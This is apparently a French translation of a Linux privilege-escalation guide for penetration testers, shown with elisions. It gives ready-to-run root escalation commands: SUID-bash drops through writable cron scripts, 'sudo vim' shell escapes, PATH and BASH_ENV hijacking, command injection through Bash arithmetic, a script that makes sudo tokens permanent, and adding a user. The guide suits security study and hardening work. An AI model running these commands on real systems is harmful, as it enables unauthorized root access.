...
Si vous **avez les permissions d'écriture sur n'importe quel dossier contenu dans la variable `PATH`**, vous pourriez être en mesure de hijack certaines libraries ou binaries :
```bash
echo $PATH
```
...
```
Des outils qui peuvent aider à rechercher des kernel exploits sont :
...
Recherchez toujours **la version du kernel sur Google**, il se peut que votre version du kernel soit mentionnée dans un exploit kernel, ce qui vous permettra d'être sûr que cet exploit est valide.
...
Les versions de Sudo antérieures à 1.9.17p1 (**1.9.14 - 1.9.17 < 1.9.17p1**) permettent à des utilisateurs locaux non privilégiés d'élever leurs privilèges en root via l'option sudo `--chroot` lorsque le fichier `/etc/nsswitch.conf` est utilisé depuis un répertoire contrôlé par l'utilisateur.
...
Si vous êtes à l'intérieur d'un docker container vous pouvez tenter d'en sortir :
...
Vérifiez **ce qui est monté et non monté**, où et pourquoi. Si quelque chose n'est pas monté, vous pouvez essayer de le monter et vérifier s'il contient des informations privées
```bash
...
```
Vérifiez aussi si **un compilateur est installé**. C'est utile si vous devez utiliser un exploit du noyau, car il est recommandé de le compiler sur la machine où vous allez l'utiliser (ou sur une similaire).
```bash
...
rpm -qa #Centos
```
Si vous avez accès SSH à la machine, vous pouvez aussi utiliser **openVAS** pour vérifier si des logiciels installés sont obsolètes ou vulnérables.

> [!NOTE] > _Notez que ces commandes afficheront beaucoup d'informations qui seront pour la plupart inutiles, il est donc recommandé d'utiliser des applications comme OpenVAS ou similaires pour vérifier si une version d'un logiciel installé est vulnérable à des exploits connus_
...
top -n 1
```
Vérifiez toujours la présence éventuelle de [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md). **Linpeas** detecte ceux-ci en vérifiant le paramètre `--inspect` dans la ligne de commande du processus.\
Vérifiez aussi **vos privilèges sur les binaires des processus**, peut‑être pouvez‑vous en écraser un.
...
Normalement vous aurez besoin de **root privileges** pour lire la mémoire des processus appartenant à d'autres utilisateurs, donc ceci est généralement plus utile lorsque vous êtes déjà root et souhaitez découvrir d'autres credentials.\
Cependant, souvenez‑vous que **as a regular user you can read the memory of the processes you own**.

> [!WARNING]
> Notez qu'aujourd'hui la plupart des machines **don't allow ptrace by default** ce qui signifie que vous ne pouvez pas obtenir un dump d'autres processus appartenant à un utilisateur non privilégié.
>
> Le fichier _**/proc/sys/kernel/yama/ptrace_scope**_ contrôle l'accessibilité de ptrace :
>
> - **kernel.yama.ptrace_scope = 0**: tous les processus peuvent être débogués, tant qu'ils ont le même uid. C'est le fonctionnement classique de ptrace.
> - **kernel.yama.ptrace_scope = 1**: seul un processus parent peut être débogué.
> - **kernel.yama.ptrace_scope = 2**: Seul un administrateur peut utiliser ptrace, car cela requiert la capability CAP_SYS_PTRACE.
...
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Vous pouvez supprimer manuellement les exigences root et dump le processus que vous possédez
...
### Crontab UI (alseambusher) s'exécutant en tant que root – ordonnanceur web privesc

Si un panneau web “Crontab UI” (alseambusher/crontab-ui) s'exécute en tant que root et est lié uniquement à loopback, vous pouvez néanmoins y accéder via SSH local port-forwarding et créer un job privilégié pour escalader.
...
```
- Créer un job avec des privilèges élevés et l'exécuter immédiatement (dépose une SUID shell):
```bash
# Name: escalate
# Command:
...
```
Durcissement
- Ne lancez pas Crontab UI en tant que root ; limitez-le à un utilisateur dédié avec des permissions minimales
- Liez à localhost et restreignez en plus l'accès via firewall/VPN ; ne réutilisez pas les mots de passe
...
Vérifiez si une tâche planifiée est vulnérable. Peut‑être pouvez‑vous tirer parti d'un script exécuté par root (wildcard vuln ? modifier des fichiers que root utilise ? utiliser des symlinks ? créer des fichiers spécifiques dans le répertoire que root utilise ?).
```bash
crontab -l
...
Si un script exécuté par root a un “**\***” à l'intérieur d'une commande, vous pouvez exploiter cela pour provoquer des comportements inattendus (comme privesc). Exemple:
```bash
...
Bash effectue l'expansion des paramètres et la substitution de commande avant l'évaluation arithmétique dans ((...)), $((...)) et let. Si un cron/parseur exécuté en root lit des champs de log non fiables et les place dans un contexte arithmétique, un attaquant peut injecter une substitution de commande $(...) qui s'exécute en root lorsque le cron tourne.

- Pourquoi ça marche : Dans Bash, les expansions se produisent dans cet ordre : expansion des paramètres/variables, substitution de commande, expansion arithmétique, puis découpage des mots et expansion des chemins. Donc une valeur comme `$(/bin/bash -c 'id > /tmp/pwn')0` est d'abord substituée (la commande s'exécute), puis le `0` numérique restant est utilisé pour l'arithmétique, de sorte que le script continue sans erreurs.
...
- Exploitation : Faites écrire du texte contrôlé par l'attaquant dans le log parsé de façon que le champ à l'apparence numérique contienne une substitution de commande et se termine par un chiffre. Assurez-vous que votre commande n'écrit pas sur stdout (ou redirigez-la) pour que l'arithmétique reste valide.
```bash
...
Si vous **pouvez modifier un cron script** exécuté en root, vous pouvez obtenir un shell très facilement :
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Si le script exécuté par root utilise un **répertoire sur lequel vous avez un accès total**, il peut être utile de supprimer ce répertoire et de **créer un symlink vers un autre répertoire** qui sert un script que vous contrôlez.
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Binaires cron signés personnalisés avec payloads modifiables
Les blue teams "signent" parfois des binaires lancés par cron en vidant une section ELF personnalisée et en faisant un grep d'une chaîne fournisseur avant de les exécuter en tant que root. Si ce binaire est group-writable (par ex., `/opt/AV/periodic-checks/monitor` owned by `root:devs 770`) et que vous pouvez leak le matériel de signature, vous pouvez forger la section et détourner la tâche cron :
...
```
3. Créez un remplaçant malveillant (par ex., déposer un SUID bash, ajouter votre SSH key) et intégrez le certificat dans `.text_sig` pour que le grep passe :
```bash
...
```
5. Attendez la prochaine exécution cron ; une fois que la vérification naive de signature réussit, votre payload s'exécute en tant que root.

### Tâches cron fréquentes

Vous pouvez surveiller les processus pour rechercher ceux qui s'exécutent toutes les 1, 2 ou 5 minutes. Peut-être pourrez-vous en tirer avantage et escalader les privilèges.
...
Vérifiez si vous pouvez écrire un fichier `.service`, si oui, vous **pourriez le modifier** afin qu'il **exécute** votre **backdoor lorsque** le service est **démarré**, **relancé** ou **arrêté** (vous devrez peut‑être attendre que la machine soit redémarrée).\
...
Gardez à l'esprit que si vous avez des **permissions d'écriture sur des binaires exécutés par des services**, vous pouvez les remplacer par des backdoors afin que, lorsque les services seront réexécutés, les backdoors s'exécutent.
...
```
Si vous constatez que vous pouvez **écrire** dans n'importe lequel des dossiers du chemin, vous pouvez potentiellement **escalate privileges**. Vous devez rechercher des **chemins relatifs utilisés dans les fichiers de configuration des services** comme :
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Ensuite, créez un **exécutable** portant **le même nom que le binaire du chemin relatif** dans le dossier PATH de systemd sur lequel vous pouvez écrire, et lorsque le service est invité à exécuter l'action vulnérable (**Start**, **Stop**, **Reload**), votre **backdoor sera exécuté** (les utilisateurs non privilégiés ne peuvent généralement pas démarrer/arrêter des services, mais vérifiez si vous pouvez utiliser `sudo -l`).

**En savoir plus sur les services avec `man systemd.service`.**

## **Timers**

**Timers** sont des unit files systemd dont le nom se termine par `**.timer**` et qui contrôlent des fichiers ou événements `**.service**`. Les **Timers** peuvent être utilisés comme alternative à cron car ils intègrent la prise en charge des événements basés sur le calendrier et des événements monotoniques, et peuvent s'exécuter de manière asynchrone.
...
> L'unité à activer lorsque ce timer arrive à échéance. L'argument est un nom d'unité, dont le suffixe n'est pas ".timer". Si non précisé, cette valeur revient par défaut à un service qui a le même nom que l'unité timer, à l'exception du suffixe. (Voir ci‑dessus.) Il est recommandé que le nom de l'unité activée et le nom de l'unité de timer soient identiques, sauf pour le suffixe.

Therefore, to abuse this permission you would need to:

- Find some systemd unit (like a `.service`) that is **exécute un binaire modifiable**
- Find some systemd unit that is **exécute un chemin relatif** and you have **privilèges d'écriture** over the **systemd PATH** (to impersonate that executable)
...
- `Accept`: Prend un argument booléen. Si **true**, une **instance de service est créée pour chaque connexion entrante** et seul le socket de connexion lui est passé. Si **false**, tous les sockets d'écoute sont **passés à l'unité de service démarrée**, et une seule unité de service est créée pour toutes les connexions. Cette valeur est ignorée pour les datagram sockets et les FIFOs où une seule unité de service gère sans condition tout le trafic entrant. **Par défaut false**. Pour des raisons de performance, il est recommandé d'écrire les nouveaux daemons de façon adaptée à `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: Accepte une ou plusieurs lignes de commande, qui sont **exécutées avant** ou **après** que les **sockets**/FIFOs d'écoute soient **créés** et liés, respectivement. Le premier élément de la ligne de commande doit être un nom de fichier absolu, suivi des arguments du processus.
...
_Notez que le système doit utiliser cette configuration de fichier socket ou le backdoor ne sera pas exécuté_
...
```
Si le socket **répond à une requête HTTP**, vous pouvez **communiquer** avec lui et peut-être **exploit some vulnerability**.

### Docker Socket accessible en écriture

Le Docker socket, souvent trouvé à `/var/run/docker.sock`, est un fichier critique qui doit être sécurisé. Par défaut, il est accessible en écriture par l'utilisateur `root` et les membres du groupe `docker`. Disposer d'un accès en écriture à ce socket peut conduire à une privilege escalation. Voici une répartition de la manière dont cela peut être réalisé et des méthodes alternatives si le Docker CLI n'est pas disponible.
...
Dans les cas où la Docker CLI n'est pas disponible, le Docker socket peut toujours être manipulé en utilisant la Docker API et des commandes `curl`.
...
3.  **Attach to the Container:** Utiliser `socat` pour établir une connexion vers le conteneur, permettant l'exécution de commandes à l'intérieur de celui-ci.
...
Après mise en place de la connexion `socat`, vous pouvez exécuter des commandes directement dans le conteneur avec un accès root au système de fichiers de l'hôte.
...
Si vous découvrez que vous pouvez utiliser la commande **`ctr`**, lisez la page suivante car **you may be able to abuse it to escalate privileges** :
...
```
**Apprenez à enumerate et exploit une communication D-Bus ici :**
...
Vérifiez si vous pouvez sniff le trafic. Si oui, vous pourriez récupérer des credentials.
```
timeout 1 tcpdump
```
## Utilisateurs
...
Vérifiez si vous êtes **membre d'un groupe** qui pourrait vous accorder des root privileges :
...
Si le bruit ne vous dérange pas et que les binaires `su` et `timeout` sont présents sur la machine, vous pouvez tenter de brute-force un utilisateur en utilisant [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
...
```
Dans cet exemple, l'utilisateur `demo` peut exécuter `vim` en tant que `root` ; il est alors trivial d'obtenir un shell en ajoutant une ssh key dans le répertoire de `root` ou en appelant `sh`.
```
sudo vim -c '!sh'
```
### SETENV
...
```
Cet exemple, **basé sur la machine HTB Admirer**, était **vulnerable** à **PYTHONPATH hijacking** pour charger une bibliothèque python arbitraire lors de l'exécution du script en tant que root :
```bash
...
- Why it works: Pour les shells non interactifs, Bash évalue `$BASH_ENV` et source ce fichier avant d'exécuter le script cible. De nombreuses règles sudo permettent d'exécuter un script ou un wrapper de shell. Si `BASH_ENV` est préservé par sudo, votre fichier est sourcé avec les privilèges root.
...
```
- Durcissement:
- Retirez `BASH_ENV` (et `ENV`) de `env_keep`, préférez `env_reset`.
- Évitez les wrappers shell pour les commandes autorisées par sudo ; utilisez des binaires minimaux.
- Envisagez la journalisation I/O de sudo et la génération d'alertes lorsque des variables d'environnement préservées sont utilisées.
...
**Accédez** pour lire d'autres fichiers ou utiliser des **symlinks**. Par exemple dans le fichier sudoers : _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
...
### Sudo command/SUID binary sans chemin spécifié pour la commande

Si l'**autorisation sudo** est donnée à une seule commande **sans spécifier le chemin** : _hacker10 ALL= (root) less_ vous pouvez l'exploiter en modifiant la variable PATH
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Cette technique peut également être utilisée si un binaire **suid** **exécute une autre commande sans préciser son chemin (vérifiez toujours avec** _**strings**_ **le contenu d'un binaire SUID étrange)**.

[Payload examples to execute.](payloads-to-execute.md)

### Binaire SUID avec chemin de commande

Si le binaire **suid** **exécute une autre commande en spécifiant le chemin**, alors, vous pouvez essayer de **export a function** nommée comme la commande que le fichier suid appelle.
...
La variable d'environnement **LD_PRELOAD** est utilisée pour spécifier une ou plusieurs bibliothèques partagées (.so) à charger par le chargeur avant toutes les autres, y compris la bibliothèque C standard (`libc.so`). Ce processus est connu sous le nom de préchargement de bibliothèque.

Cependant, pour maintenir la sécurité du système et éviter que cette fonctionnalité soit exploitée, en particulier avec les exécutables **suid/sgid**, le système impose certaines conditions :
...
Lorsqu'on tombe sur un binaire ayant les permissions **SUID** et qui semble inhabituel, il est conseillé de vérifier s'il charge correctement les fichiers **.so**. Cela peut être vérifié en exécutant la commande suivante :
```bash
...
Le projet recense des fonctions légitimes de binaires Unix pouvant être détournées pour s'échapper de restricted shells, escalader ou maintenir des privilèges élevés, transférer des fichiers, spawn bind and reverse shells, et faciliter les autres tâches de post-exploitation.
...
- "_sampleuser_" a **utilisé `sudo`** pour exécuter quelque chose au cours des **15 dernières minutes** (par défaut c'est la durée du sudo token qui nous permet d'utiliser `sudo` sans retaper le mot de passe)
...
/tmp/sh -p
```
- Le **troisième exploit** (`exploit_v3.sh`) **créera un fichier sudoers** qui rendra les **jetons sudo éternels et permettra à tous les utilisateurs d'utiliser sudo**
```bash
bash exploit_v3.sh
sudo su
```
...
**Si** vous pouvez **lire** ce fichier, vous pourriez être en mesure d'**obtenir des informations intéressantes**, et si vous pouvez **écrire** dans n'importe quel fichier, vous pourrez **élever vos privilèges**.
```bash
...
Le fichier `/etc/ld.so.conf` indique **d'où proviennent les fichiers de configuration chargés**. Typiquement, ce fichier contient la ligne suivante : `include /etc/ld.so.conf.d/*.conf`
...
Access Control Lists (ACLs) représentent la couche secondaire des permissions discrétionnaires, capables de **outrepasser les permissions traditionnelles ugo/rwx**. Ces permissions améliorent le contrôle d'accès aux fichiers ou répertoires en autorisant ou refusant des droits à des utilisateurs spécifiques qui ne sont ni les propriétaires ni membres du groupe. Ce niveau de **granularité permet une gestion des accès plus précise**. Plus de détails sont disponibles [**ici**](https://linuxconfig.org/how-to-manage-acls-on-linux).
...
```
**Obtenir** des fichiers du système avec des ACL spécifiques :
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## Sessions shell ouvertes

Dans les **anciennes versions** il est possible de **hijack** une **session shell** d'un autre utilisateur (**root**).\
Dans les **versions récentes**, vous ne pourrez **vous connecter** qu'aux sessions screen de **votre propre utilisateur**. Cependant, vous pourriez trouver des **informations intéressantes à l'intérieur de la session**.
...
- **PermitEmptyPasswords**: Lorsque l'authentification par mot de passe est autorisée, spécifie si le serveur autorise la connexion aux comptes avec des mots de passe vides. La valeur par défaut est `no`.

### PermitRootLogin

Spécifie si root peut se connecter via ssh, la valeur par défaut est `no`. Valeurs possibles :

- `yes`: root peut se connecter en utilisant mot de passe et clé privée
...
```
Cette configuration indique que si vous essayez de vous connecter avec la clé **private** de l'utilisateur "**testusername**" ssh va comparer la clé publique de votre clé avec celles situées dans `/home/testusername/.ssh/authorized_keys` et `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding vous permet de **use your local SSH keys instead of leaving keys** (without passphrases!) sur votre serveur. Ainsi, vous pourrez **jump** via ssh **to a host** et depuis cet hôte **jump to another** host **using** la **key** située sur votre **initial host**.
...
Si vous constatez que Forward Agent est configuré dans un environnement, lisez la page suivante car **vous pourriez être en mesure de l'abuser pour escalader des privilèges** :
...
Le fichier `/etc/profile` et les fichiers sous `/etc/profile.d/` sont **des scripts exécutés lorsqu'un utilisateur lance un nouveau shell**. Par conséquent, si vous pouvez **écrire ou modifier l'un d'entre eux, vous pouvez escalader vos privilèges**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Si un script de profil suspect est trouvé, vérifiez-le pour des **informations sensibles**.
...
```bash
# Generated password:
PASSWORD='vX9!q2Z#b7Ns5LpR'

# Add user 'hacker' with home directory and bash shell
...
Sinon, vous pouvez utiliser les lignes suivantes pour ajouter un utilisateur factice sans mot de passe.\
...
Vous devez vérifier si vous pouvez **écrire dans certains fichiers sensibles**. Par exemple, pouvez-vous écrire dans un **fichier de configuration d'un service** ?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Par exemple, si la machine exécute un serveur **tomcat** et que vous pouvez **modifier le fichier de configuration du service Tomcat situé dans /etc/systemd/,** alors vous pouvez modifier les lignes :
```
...
Les répertoires suivants peuvent contenir des sauvegardes ou des informations intéressantes : **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Il est probable que vous ne puissiez pas lire le dernier, mais essayez)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Emplacements bizarres/Owned fichiers
```bash
...
```
### Fichiers connus contenant des passwords

Consultez le code de [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), il recherche **plusieurs fichiers susceptibles de contenir des passwords**.\
**Un autre outil intéressant** que vous pouvez utiliser est : [**LaZagne**](https://github.com/AlessandroZ/LaZagne) qui est une application open source utilisée pour récupérer de nombreux passwords stockés sur un ordinateur local pour Windows, Linux & Mac.
...
De plus, des "**bad**" configurés (backdoored?) **audit logs** peuvent vous permettre d'**enregistrer des passwords** dans les audit logs comme expliqué dans ce post: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
...
Vous devriez aussi vérifier les fichiers contenant le mot "**password**" dans leur **nom** ou à l'intérieur de leur **contenu**, et aussi vérifier la présence d'IPs et d'emails dans les logs, ou des hashes et regexps.\
...
Une vulnérabilité dans `logrotate` permet aux utilisateurs ayant des **write permissions** sur un fichier de log ou ses répertoires parents de potentiellement obtenir une élévation de privilèges. En effet, `logrotate`, souvent exécuté en tant que **root**, peut être manipulé pour exécuter des fichiers arbitraires, notamment dans des répertoires comme _**/etc/bash_completion.d/**_. Il est important de vérifier les permissions non seulement dans _/var/log_ mais aussi dans tout répertoire où la rotation des logs est appliquée.

> [!TIP]
> Cette vulnérabilité affecte `logrotate` version `3.18.0` and older
...
Cette vulnérabilité est très similaire à [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** donc chaque fois que vous constatez que vous pouvez modifier des logs, vérifiez qui gère ces logs et voyez si vous pouvez escalader les privilèges en remplaçant les logs par des symlinks.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Vulnerability reference:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

Si, pour une raison quelconque, un utilisateur est capable d'**écrire** un script `ifcf-<whatever>` dans _/etc/sysconfig/network-scripts_ **ou** de **modifier** un script existant, alors votre **system is pwned**.

Network scripts, _ifcg-eth0_ par exemple, sont utilisés pour les connexions réseau. Ils ressemblent exactement à des fichiers .INI. Cependant, ils sont \~sourced\~ on Linux by Network Manager (dispatcher.d).

Dans mon cas, l'attribut `NAME=` dans ces scripts réseau n'est pas correctement géré. Si vous avez un **espace blanc/vide dans le nom le système tente d'exécuter la partie après l'espace blanc/vide**. Cela signifie que **tout ce qui se trouve après le premier espace est exécuté en tant que root**.
...
En revanche, `/etc/init` est associé à **Upstart**, un **gestionnaire de services** plus récent introduit par Ubuntu, utilisant des fichiers de configuration pour les tâches de gestion des services. Malgré la transition vers Upstart, les scripts SysVinit sont toujours utilisés aux côtés des configurations Upstart grâce à une couche de compatibilité dans Upstart.

**systemd** apparaît comme un gestionnaire d'initialisation et de services moderne, offrant des fonctionnalités avancées telles que le démarrage à la demande des daemons, la gestion des automounts et les snapshots d'état du système. Il organise les fichiers dans `/usr/lib/systemd/` pour les paquets de distribution et `/etc/systemd/system/` pour les modifications de l'administrateur, simplifiant ainsi l'administration système.
...
Les Android rooting frameworks hookent souvent un syscall pour exposer des fonctionnalités du kernel avec privilèges à un manager en userspace. Une authentification faible du manager (p.ex., des vérifications de signature basées sur FD-order ou des schémas de mot de passe faibles) peut permettre à une application locale de se faire passer pour le manager et d'escalader en root sur des appareils déjà rootés. En savoir plus et détails d'exploitation ici :
...
La discovery de services pilotée par regex dans VMware Tools/Aria Operations peut extraire un chemin binaire depuis les lignes de commande des processus et l'exécuter avec -v dans un contexte privilégié. Des patterns permissifs (p.ex., utilisant \S) peuvent correspondre à des listeners déposés par un attaquant dans des emplacements inscriptibles (p.ex., /tmp/httpd), conduisant à une exécution en root (CWE-426 Untrusted Search Path).
